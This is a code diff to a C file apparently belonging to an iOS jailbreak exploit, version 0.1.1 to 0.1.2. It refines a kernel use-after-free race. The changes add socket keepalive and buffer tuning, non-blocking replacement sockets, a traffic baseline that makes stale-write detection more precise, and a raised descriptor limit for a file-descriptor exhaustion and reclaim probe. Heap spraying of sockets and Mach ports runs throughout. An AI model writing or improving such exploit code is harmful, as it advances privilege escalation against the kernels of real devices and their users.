@@ -2,6 +2,7 @@
 
 #include <arpa/inet.h>
 #include <errno.h>
+#include <fcntl.h>
 #include <mach/mach.h>
 #include <mach/message.h>
 #include <netinet/in.h>
@@ -15,6 +16,7 @@
 #include <stdlib.h>
 #include <string.h>
 #include <sys/socket.h>
+#include <sys/resource.h>
 #include <sys/time.h>
 #include <sys/types.h>
 #include <unistd.h>
@@ -23,7 +25,11 @@
 #define IOSJB_MAX_SPRAY 256
 #define IOSJB_OOL_PORTS 768
 #define IOSJB_OOL_SIZE 832
-#define IOSJB_EXHAUST_FDS 1024
+#define IOSJB_EXHAUST_FDS 4096
+
+#ifndef TCP_KEEPALIVE
+#define TCP_KEEPALIVE 0x10
+#endif
 
 extern void iosjb_swift_log(const char *message);
 
@@ -125,9 +131,15 @@ static int connect_loopback(uint16_t port) {
     setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
 
     int value = 1;
+    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &value, sizeof(value));
+    setsockopt(fd, IPPROTO_TCP, TCP_KEEPALIVE, &value, sizeof(value));
+    setsockopt(fd, IPPROTO_TCP, TCP_KEEPINTVL, &value, sizeof(value));
+    value = 3;
+    setsockopt(fd, IPPROTO_TCP, TCP_KEEPCNT, &value, sizeof(value));
+    value = 1;
     setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &value, sizeof(value));
 
-    value = 16384;
+    value = 262144;
     setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &value, sizeof(value));
     setsockopt(fd, SOL_SOCKET, SO_RCVBUF, &value, sizeof(value));
 
@@ -145,6 +157,10 @@ static int connect_loopback(uint16_t port) {
     if (connect(fd, (struct sockaddr *)&address, sizeof(address)) != 0) {
         close(fd);
         return -1;
+    }
+    int flags = fcntl(fd, F_GETFL, 0);
+    if (flags >= 0) {
+        (void)fcntl(fd, F_SETFL, flags | O_NONBLOCK);
     }
     return fd;
 }
@@ -353,20 +369,34 @@ static int run_oracle(int iterations, int senders, int spray_count,
             created += 1;
         }
 
+        // Match the public precision variant: give every fresh replacement
+        // socket a small amount of traffic so both sides of the socket buffer
+        // are active while the stale senders finish. Bytes beyond this fixed
+        // baseline are attributed to the stale write.
+        uint8_t contention_byte = 0x42;
+        for (int index = 0; index < created; index++) {
+            for (int attempt = 0; attempt < 3; attempt++) {
+                (void)send(spray_fds[index], &contention_byte, 1,
+                           MSG_DONTWAIT | MSG_NOSIGNAL);
+            }
+        }
+
         wait_for_done(senders);
         close(target_peer);
-        usleep(1000);
+        usleep(150);
 
         int iteration_bytes = 0;
         for (int index = 0; index < created; index++) {
             iteration_bytes += peer_bytes(spray_peers[index]);
         }
 
-        if (iteration_bytes > 0) {
+        int baseline = created * 3;
+        int stale_bytes = iteration_bytes > baseline ? iteration_bytes - baseline : 0;
+        if (stale_bytes > 512) {
             hits += 1;
-            total_stale_bytes += iteration_bytes;
-            log_message("[!] STALE WRITE CONFIRMED / 已确认陈旧写入：迭代=%d 字节=%d",
-                        iteration, iteration_bytes);
+            total_stale_bytes += stale_bytes;
+            log_message("[!] STALE WRITE CONFIRMED / 已确认陈旧写入：迭代=%d 净字节=%d",
+                        iteration, stale_bytes);
         }
 
         close_array(spray_fds, created);
@@ -470,6 +500,16 @@ static void ool_cleanup(void) {
 }
 
 static int run_reclaim_probe(void) {
+    struct rlimit limit;
+    if (getrlimit(RLIMIT_NOFILE, &limit) == 0) {
+        if (limit.rlim_cur < (rlim_t)IOSJB_EXHAUST_FDS) {
+            limit.rlim_cur = limit.rlim_max < (rlim_t)IOSJB_EXHAUST_FDS
+                ? limit.rlim_max
+                : (rlim_t)IOSJB_EXHAUST_FDS;
+            (void)setrlimit(RLIMIT_NOFILE, &limit);
+        }
+    }
+
     int fds[IOSJB_EXHAUST_FDS];
     for (int index = 0; index < IOSJB_EXHAUST_FDS; index++) {
         fds[index] = -1;
@@ -597,6 +637,6 @@ int32_t iosjb_is_running(void) {
 }
 
 const char *iosjb_version(void) {
-    return "0.1.1";
+    return "0.1.2";
 }
 
